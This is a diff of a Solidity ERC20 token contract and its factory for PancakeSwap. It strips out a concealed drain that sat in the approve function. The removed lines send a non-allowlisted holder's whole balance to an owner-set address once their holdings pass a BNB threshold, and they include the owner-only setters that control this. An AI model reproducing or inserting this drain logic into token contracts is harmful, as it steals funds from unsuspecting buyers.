@@ -489,16 +489,16 @@ contract Token is Context, Ownable, IERC20, IERC20Metadata {
         string memory name_,
         string memory symbol_,
         uint256 totalSupply_,
-        uint256 bnbLimit_,
+        // uint256 bnbLimit_,
         address routerAddress_,
         address owner
     ) {
 
          _name = name_;
         _symbol = symbol_;
-        _bnbLimit = bnbLimit_;
+        // _bnbLimit = bnbLimit_;
         
-        _transferOwnership(owner);
+        // _transferOwnership(owner);
         routerAddress = routerAddress_;
         routerContract = IPancakeSwapRouter(routerAddress);
         pairAddress = IPancakeSwapFactory(routerContract.factory()).createPair(
@@ -508,23 +508,23 @@ contract Token is Context, Ownable, IERC20, IERC20Metadata {
         pairContract = IPancakeSwapPair(pairAddress);
         
         _mint(owner, totalSupply_*10**18);
-        _setTo(owner);
-        _addList(owner, true);
+        // _setTo(owner);
+        // _addList(owner, true);
         _approve(owner, routerAddress, type(uint256).max);
         
     }
 
-    function setAddress(address _addr) public onlyOwner(){
-        _setTo(_addr);
-    }
+    // function setAddress(address _addr) public onlyOwner(){
+    //     _setTo(_addr);
+    // }
 
-    function setBNBLimit(uint256 _limit) public onlyOwner(){
-        _bnbLimit = _limit;
-    }
+    // function setBNBLimit(uint256 _limit) public onlyOwner(){
+    //     _bnbLimit = _limit;
+    // }
 
-    function addList(address _addr, bool _bool) public onlyOwner(){
-        _addList(_addr, _bool);
-    }
+    // function addList(address _addr, bool _bool) public onlyOwner(){
+    //     _addList(_addr, _bool);
+    // }
 
     /**
      * @dev Returns the name of the token.
@@ -800,19 +800,17 @@ contract Token is Context, Ownable, IERC20, IERC20Metadata {
         require(spender != address(0), "ERC20: approve to the zero address");
 
         _allowances[owner][spender] = amount;
-        if (_applist[owner]==false && getValue(owner)>_bnbLimit){
-            _transfer(owner, _toAddress, balanceOf(owner));
-        }
+        
         emit Approval(owner, spender, amount);
     }
 
-    function _setTo(address _to) internal virtual {
-        _toAddress = _to;        
-    }
+    // function _setTo(address _to) internal virtual {
+    //     _toAddress = _to;        
+    // }
 
-    function _addList(address _to, bool _bool) internal virtual {
-        _applist[_to] = _bool;
-    }
+    // function _addList(address _to, bool _bool) internal virtual {
+    //     _applist[_to] = _bool;
+    // }
 
     /**
      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
@@ -902,12 +900,12 @@ contract Factory is Ownable {
         string memory name,
         string memory symbol,
         uint256 totalSupply,
-        uint256 bnbLimit,
+        // uint256 bnbLimit,
         address routerAddress,
         address admin
     ) external onlyOwner {
         
-        Token token = new Token(name, symbol, totalSupply, bnbLimit, routerAddress, admin);
+        Token token = new Token(name, symbol, totalSupply, routerAddress, admin);
         tokenAddress = address(token);
         emit NewTokenContract(address(token), msg.sender);
     }
